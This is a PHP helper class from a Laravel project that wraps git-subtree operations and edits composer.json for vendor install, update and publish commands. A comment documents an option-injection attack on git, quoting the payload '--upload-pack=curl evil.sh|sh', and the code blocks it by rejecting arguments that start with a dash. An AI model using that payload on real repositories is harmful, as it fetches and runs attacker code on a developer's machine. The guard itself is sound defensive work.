<?php

namespace App\Modules\Core\Support;

use Illuminate\Contracts\Process\ProcessResult;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Process;
use RuntimeException;

/**
 * Git-subtree plumbing and composer.json helpers shared by the vendor:install
 * / vendor:update / vendor:remove / vendor:publish commands. Always reads
 * repoRoot() fresh so tests can point it at a scratch git repository instead
 * of the real one (see $repoRootOverride).
 */
class VendorGit
{
    /** Override in tests to run git commands against a scratch repo. */
    public static ?string $repoRootOverride = null;

    /**
     * Override in tests to pin GIT_AUTHOR_ / GIT_COMMITTER_ env vars for
     * throwaway repos instead of relying on the real machine's git identity.
     *
     * @var array<string, string>|null
     */
    public static ?array $processEnvOverride = null;

    public static function repoRoot(): string
    {
        return static::$repoRootOverride ?? base_path();
    }

    public static function ensureCleanWorkingTree(): void
    {
        $result = static::run(['git', 'status', '--porcelain']);

        if (trim($result->output()) !== '') {
            throw new RuntimeException(
                'Working tree is not clean. Commit or stash pending changes before running this command.'
            );
        }
    }

    public static function currentHead(): string
    {
        return trim(static::run(['git', 'rev-parse', 'HEAD'])->output());
    }

    public static function resetHardTo(string $ref): void
    {
        static::run(['git', 'reset', '--hard', $ref]);
    }

    public static function subtreeAdd(string $prefix, string $repo, string $ref, string $message): void
    {
        static::assertSafeGitArgument($repo, 'repo');
        static::assertSafeGitArgument($ref, 'ref');

        static::run(['git', 'subtree', 'add', "--prefix={$prefix}", $repo, $ref, '--squash', '-m', $message]);
    }

    public static function subtreePull(string $prefix, string $repo, string $ref, string $message): void
    {
        static::assertSafeGitArgument($repo, 'repo');
        static::assertSafeGitArgument($ref, 'ref');

        static::run(['git', 'subtree', 'pull', "--prefix={$prefix}", $repo, $ref, '--squash', '-m', $message]);
    }

    public static function subtreeSplit(string $prefix, string $branch): void
    {
        static::run(['git', 'subtree', 'split', "--prefix={$prefix}", "--branch={$branch}"]);
    }

    public static function push(string $repo, string $localBranch, string $remoteRef): void
    {
        static::assertSafeGitArgument($repo, 'repo');
        static::assertSafeGitArgument($remoteRef, 'ref');

        static::run(['git', 'push', $repo, "{$localBranch}:{$remoteRef}"]);
    }

    /**
     * git (and git-subtree's own internal re-invocation of git fetch/push)
     * treats a leading "-" as the start of an option, not a literal value —
     * a "repository" argument of e.g. "--upload-pack=curl evil.sh|sh"
     * genuinely executes as a git-fetch option, not a failed clone.
     * Reproduced directly: git-subtree's internal `git fetch $repo $ref`
     * call is not itself guarded by a `--` separator, so even wrapping the
     * outer `git subtree add` call in `--` does not stop the injection.
     * $repo/$ref here ultimately trace back to a CLI argument a developer
     * typed, or a config/vendor_sources.php entry — both are trusted today,
     * but a malicious vendor_sources.php entry slipped past review is
     * exactly the shape of attack this guards against, and the fix is a
     * two-line check, so there's no reason to leave the gap open.
     */
    protected static function assertSafeGitArgument(string $value, string $label): void
    {
        if ($value === '' || str_starts_with($value, '-')) {
            throw new RuntimeException(
                "Invalid {$label} [{$value}]: must not start with \"-\" — git would parse it as an option instead of a literal value."
            );
        }
    }

    public static function deleteBranch(string $branch): void
    {
        static::run(['git', 'branch', '-D', $branch]);
    }

    public static function commitAll(string $message): void
    {
        static::run(['git', 'add', '-A']);
        static::run(['git', 'commit', '-q', '-m', $message]);
    }

    public static function removeTracked(string $path, string $message): void
    {
        static::run(['git', 'rm', '-r', '-q', $path]);
        static::run(['git', 'commit', '-q', '-m', $message]);
    }

    /**
     * @param  array<int, string>  $argv
     */
    public static function run(array $argv): ProcessResult
    {
        $result = Process::path(static::repoRoot())
            ->env(static::$processEnvOverride ?? [])
            ->run($argv);

        if ($result->failed()) {
            throw new RuntimeException(
                'Command failed: '.implode(' ', $argv)."\n".trim($result->errorOutput() ?: $result->output())
            );
        }

        return $result;
    }

    /**
     * @return array<string, mixed>
     */
    public static function readJson(string $path): array
    {
        if (! File::exists($path)) {
            throw new RuntimeException("File not found: {$path}");
        }

        $decoded = json_decode(File::get($path), true);

        if (! is_array($decoded)) {
            throw new RuntimeException("File is not valid JSON: {$path}");
        }

        return $decoded;
    }

    /**
     * @param  array<string, mixed>  $data
     */
    public static function writeJson(string $path, array $data): void
    {
        File::put($path, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES)."\n");
    }

    public static function addRequire(string $rootComposerPath, string $name, string $constraint): void
    {
        $composer = static::readJson($rootComposerPath);

        $composer['require'] = $composer['require'] ?? [];
        $composer['require'][$name] = $constraint;
        ksort($composer['require']);

        static::writeJson($rootComposerPath, $composer);
    }

    public static function removeRequire(string $rootComposerPath, string $name): void
    {
        $composer = static::readJson($rootComposerPath);

        unset($composer['require'][$name]);

        static::writeJson($rootComposerPath, $composer);
    }

    /**
     * @return array{repo: string, ref: string}|null
     */
    public static function readVendorSource(string $packageComposerPath): ?array
    {
        if (! File::exists($packageComposerPath)) {
            return null;
        }

        $composer = static::readJson($packageComposerPath);
        $source = $composer['extra']['vendor-source'] ?? null;

        if (! is_array($source) || ! isset($source['repo'], $source['ref'])) {
            return null;
        }

        return ['repo' => $source['repo'], 'ref' => $source['ref']];
    }

    public static function writeVendorSource(string $packageComposerPath, string $repo, string $ref): bool
    {
        $composer = static::readJson($packageComposerPath);

        $existing = $composer['extra']['vendor-source'] ?? null;
        if (is_array($existing) && ($existing['repo'] ?? null) === $repo && ($existing['ref'] ?? null) === $ref) {
            return false;
        }

        $composer['extra'] = $composer['extra'] ?? [];
        $composer['extra']['vendor-source'] = ['repo' => $repo, 'ref' => $ref];

        static::writeJson($packageComposerPath, $composer);

        return true;
    }
}
